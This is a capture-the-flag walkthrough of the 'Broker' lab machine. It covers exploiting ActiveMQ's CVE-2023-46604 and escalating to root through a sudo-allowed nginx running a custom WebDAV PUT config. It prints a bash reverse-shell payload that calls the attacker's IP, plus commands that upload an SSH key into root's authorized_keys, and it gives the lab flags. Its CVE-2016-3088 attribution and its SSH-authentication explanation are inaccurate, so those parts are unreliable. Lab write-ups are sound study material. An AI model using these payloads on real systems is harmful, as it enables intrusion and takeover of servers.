#box #nginx #webdav #ReverseShell #ssh-keygen 
Broker is a box involving the presence of **ActiveMQ** hosted on port 80. **ActiveMQ** is an open source message broker, so basically it provides a layer to communicate between more clients or servers. It's written in **Java**.

![[attachments/broker-writeup-1.webp]]

All the box exploitation works around ActiveMQ and its capabilities, in fact the foothold is obtained by leveraging a vulnerability that allows to RCE throughout an Unmarshaling function in the OpenWire transport connector, hosted on **:61616**.
The vulnerability is tagged [CVE-2023-46604](https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis).

## Nmap

We have an initial scan with nmap, discovering exclusively **ssh** and **:80** 

`nmap -sC -sV --min-rate=10000 10.129.16.254`

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-18 15:12 UTC
Nmap scan report for broker.htb (10.129.16.254)
Host is up (0.047s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.13 seconds
```

By forcing a full port scan `-p-` we then obtain further information also on other available ports.

`nmap -sC -sV --min-rate=10000 10.129.16.254 -p-`

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-18 15:14 UTC
Warning: 10.129.16.254 giving up on port because retransmission cap hit (10).
Nmap scan report for broker.htb (10.129.16.254)
Host is up (0.34s latency).
Not shown: 62689 closed tcp ports (reset), 2836 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/MasterBroker: 
|_    ActiveMQ/Advisory/Consumer/Topic/#: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
44833/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn\'t have a title.
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.95%I=7%D=4/18%Time=68026C6E%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\
SF:xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01
SF:\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20cli
SF:ent\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89,"AM
SF:QP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1
SF:\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x0
SF:2\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20using\x2
SF:0unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\0\0A
SF:MQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`
SF:\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:d
SF:ecode-error\xa17Connection\x20from\x20client\x20using\x20unsupported\x2
SF:0AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\
SF:0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x0
SF:2\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Co
SF:nnection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted
SF:")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\
SF:x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\
SF:0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connecti
SF:on\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(D
SF:NSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0
SF:\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x1
SF:8\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20f
SF:rom\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLSessi
SF:onReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0
SF:\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S
SF:\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client
SF:\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCookie,
SF:89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x
SF:04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\x
SF:c0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20us
SF:ing\x20unsupported\x20AMQP\x20attempted");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61613-TCP:V=7.95%I=7%D=4/18%Time=68026C67%P=x86_64-pc-linux-gnu%r(H
SF:ELP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknown\x20STOMP
SF:\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.Protoco
SF:lException:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20org\.apache
SF:\.activemq\.transport\.stomp\.ProtocolConverter\.onStompCommand\(Protoc
SF:olConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.transport\.stom
SF:p\.StompTransportFilter\.onCommand\(StompTransportFilter\.java:85\)\n\t
SF:at\x20org\.apache\.activemq\.transport\.TransportSupport\.doConsume\(Tr
SF:ansportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.transport\.tc
SF:p\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org\.apache\.
SF:activemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.java:215\)\n
SF:\tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## :80

By reaching port **:80** we get asked for credentials. We try `admin:admin` and we luckily get in.
Once inside, we recognize we're dealing with ActiveMQ and by looking online we notice the presence of a vulnerability tagged [CVE-2023-46604](https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis). The vulnerability deals with an Unmarshaling function present in the OpenWire connector that allows remote unauthenticated deserialization. By checking out the vulnerability's overview, we discover that the OpenWire port is 61616 and by looking at our nmap scan we discover that it's open. To exploit the vulnerability we must create a `.xml` file on our machine with the desired command hidden in a `<value>` tag.
We discover this [exploit](https://github.com/evkl1d/CVE-2023-46604) and we `wget` it on our machine.
Once we get it, we configure a reverse shell to our machine inside of the `poc.xml` file took as a reference [here](https://github.com/evkl1d/CVE-2023-46604/blob/main/poc.xml)

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
	    <list>
	        <value>bash</value>
	        <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.16.20/4444 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

We then start a webserver in the `poc.xml` folder `python3 -m http.server 8000` and run the exploit script with:

```python
python3 exploit.py -i 10.129.16.254 -p 61616 -u http://10.10.16.20:8000/poc.xml # -i is the address of the target and -p is OpenWire's port
```

Obtaining a foothold on the machine.
User: `eb60f9bc097cfd8fd4fd5dbc546b3062`

## Privilege Escalation

Once inside the machine, we run `sudo -l` to check for our capabilities.
We discover that our user can run as sudo `nginx`, precisely:

```bash
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Having the chance to run nginx means having the possibility to set up a new web server to satisfy our requests.

By using the `help` flag of **nginx** `-h` we discover the available commands. We use  `-t` to discover the path to the currently read configuration file.

```bash
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
```

By checking the config file, nothing helps us in discovering credentials or any pointing to non-known URLs.

```bash
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
	worker_connections 768;
	# multi_accept on;
}

http {

	##
	# Basic Settings
	##

	sendfile on;
	tcp_nopush on;
	types_hash_max_size 2048;
	# server_tokens off;

	# server_names_hash_bucket_size 64;
	# server_name_in_redirect off;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	##
	# SSL Settings
	##

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
	ssl_prefer_server_ciphers on;

	##
	# Logging Settings
	##

	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;

	##
	# Gzip Settings
	##

	gzip on;

	# gzip_vary on;
	# gzip_proxied any;
	# gzip_comp_level 6;
	# gzip_buffers 16 8k;
	# gzip_http_version 1.1;
	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

	##
	# Virtual Host Configs
	##

	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}


#mail {
#	# See sample authentication script at:
#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
#
#	# auth_http localhost/auth.php;
#	# pop3_capabilities "TOP" "USER";
#	# imap_capabilities "IMAP4rev1" "UIDPLUS";
#
#	server {
#		listen     localhost:110;
#		protocol   pop3;
#		proxy      on;
#	}
#
#	server {
#		listen     localhost:143;
#		protocol   imap;
#		proxy      on;
#	}
#}
```

### Creating a custom webserver with `nginx`

We then decide to create a new config file from scratch. 
This time the config file will have:
1. The `user` set to **root** rather than **www-data**.
2. A new configuration for a `http.server` that listens on a port of our choice (in the case below **:1337**), a default location with a rootPath of `/`
3. Most importantly, a `dav_methods` set with value `PUT`. 
The last is the most important part since it refers to [CVE-2016-3088](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3088)

```bash
user root;					                # Changed user to get a shell as root
worker_processes auto;
pid /run/nginx2.pid;				        # Changed process name to avoid PID / Process Name overlaps and to avoid having to stop the other conf file
include /etc/nginx/modules-enabled/*.conf;

events {
	worker_connections 768;
}

http {
	server {
		listen 1337;			            # Changed the listening port, this will be our target port to get a shell
		location / {                        # Default endpoint to call in order to reach the given webserver
			root /;			                # Path in the webserver that matches the location above. (this means that if we upload a file in `/` the file is gonna appear in the root folder of the victim's machine).
		}
		dav_methods PUT;		            # On April 14, 2016, foreign security researcher Simon Zuckerbraun exposed multiple security vulnerabilities in Apache ActiveMQ Fileserver, which could allow remote attackers to replace web applications with malicious code and execute remote code on affected systems (CVE-2016-3088).
	}
}
```

Once configured, we can run `nginx` with the `-c` flag to properly startup our custom webserver.

```bash
sudo /usr/sbin/nginx -c /tmp/nginx.conf
```

We check that the webserver is up by `ss -lntp | grep 1337`, obtaining `LISTEN 0      511          0.0.0.0:1337       0.0.0.0:* `

CVE-2016-3088 consists in a vulnerability that permits an user, given a defined webserver with `dav_methods PUT` , to upload a file of choice directly onto the machine.

As a litmus test we can upload an arbitrary file and check whether the file is now present in the given folder:
`curl -T lapislazzuli.txt http://10.129.16.254:1337/`

```bash
activemq@broker:/$ ll | grep lapislazzuli
-rw-------   1 root root    57 Apr 18 16:05 lapislazzuli.txt     # Uploaded file
```

### Craft a SSH Key with `ssh_keygen`

At this point, we can look how the file was created by `root`, since we specified that in our webserver configuration.
We can now consider the idea to craft a ssh key with `ssh_keygen` and upload it in root's `authorized_keys` folder.

```bash
$ fygonacci > ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): rsa
Enter passphrase for "rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in rsa
Your public key has been saved in rsa.pub
The key fingerprint is:
SHA256:22Wx+rcMZlLyNh7V3Hu/ipCUT606lpozfCVADlJ4qVk root@5f46616e9232
The key's randomart image is:
+--[ED25519 256]--+
|    o..          |
|   o E .         |
|    * +     .    |
|   o   o  . .o o.|
|        So..=.. +|
|        .++O..  .|
|      . .oBoO  ..|
|       +.=oB.=. o|
|       o*...oo+oo|
+----[SHA256]-----+
```
### Upload the key to root's authorized keys and connect in ssh as root

At this point we can upload the **public** key inside the target's `authorized_keys` folder to allow our private key to access the machine by leveraging the PUT vulnerability specified above.

```bash
curl -T rsa.pub http://10.129.16.254:1337/root/.ssh/authorized_keys
```

At this point, we shall be able to connect as `root`

```bash
ssh -i rsa root@10.129.16.254
```

Root: `db8cf3f30db7fae61cb8b66e03ea5c6c`

## Bonus: SSH Key authentication explanation

Due to the nature of SSH, during the handshaking process the SSH sends a message to the client. If the client, within its public key, is able to decrypt the message, then he's granted the access in SSH, otherwise the authentication fails.

![[attachments/broker-writeup-2.webp]]